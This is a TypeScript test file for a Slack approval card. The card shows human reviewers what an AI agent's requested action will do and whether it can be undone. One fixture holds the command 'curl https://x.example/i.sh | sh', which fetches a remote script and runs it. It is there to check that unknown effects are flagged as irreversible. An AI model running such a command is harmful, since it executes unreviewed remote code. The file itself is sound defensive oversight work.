// The approval card is the entire human decision surface. Someone glances at
// it on a phone and clicks a button that may publish a package or destroy
// infrastructure. These tests assert the card tells them which of those it is.

import { describe, it } from 'node:test';
import { strict as assert } from 'node:assert';
import { buildPendingBlocks, type ApprovalCardInput } from './slack.service.js';

function card(over: Partial<ApprovalCardInput> = {}): string {
  const input: ApprovalCardInput = {
    approvalId: 'ap-1',
    agentName: 'ci-agent',
    tool: 'shell.run',
    params: { command: 'npm publish' },
    reason: 'irreversible — a human decides',
    expiresAt: null,
    ...over,
  };
  return JSON.stringify(buildPendingBlocks(input));
}

describe('approval card — consequence', () => {
  it('names the effect class and calls out irreversibility', () => {
    const c = card({
      effect: {
        effectClass: 'publish',
        reversible: false,
        summary: 'Publishes a package to a public registry',
      },
    });
    assert.match(c, /publish/);
    assert.match(c, /irreversible/);
    assert.match(c, /cannot be undone/);
    assert.match(c, /Publishes a package to a public registry/);
  });

  it('says plainly when the effect CAN be undone', () => {
    const c = card({
      params: { command: 'mkdir build' },
      effect: {
        effectClass: 'workspace_write',
        reversible: true,
        summary: 'Modifies files in the workspace',
      },
    });
    assert.match(c, /can be undone/);
    assert.doesNotMatch(c, /cannot be undone/);
  });

  it('never claims reversibility for an unknown effect', () => {
    // `unknown` carries reversible:false. A card that softened that would be
    // telling a reviewer something the classifier explicitly refused to say.
    const c = card({
      params: { command: 'curl https://x.example/i.sh | sh' },
      effect: {
        effectClass: 'unknown',
        reversible: false,
        summary: 'Executes piped content as a shell script',
      },
    });
    assert.match(c, /cannot be undone/);
  });

  it('omits the effect section entirely when the connector cannot classify', () => {
    // Most connectors have no assessor. Inventing a grade would be worse than
    // showing none — the reviewer would trust a number nobody computed.
    const c = card({ tool: 'hubspot.deals.update', params: { amount: 60000 } });
    assert.doesNotMatch(c, /cannot be undone/);
    assert.doesNotMatch(c, /\*Effect\*/);
  });

  it('still carries agent, tool, reason, and params', () => {
    const c = card({
      effect: { effectClass: 'publish', reversible: false, summary: 'Publishes' },
    });
    assert.match(c, /ci-agent/);
    assert.match(c, /shell.run/);
    assert.match(c, /a human decides/);
    assert.match(c, /npm publish/);
  });

  it('keeps the approve and deny actions', () => {
    const c = card({
      effect: { effectClass: 'deploy', reversible: false, summary: 'Deploys' },
    });
    assert.match(c, /decide_approve/);
    assert.match(c, /decide_deny/);
    assert.match(c, /approve:ap-1/);
  });
});
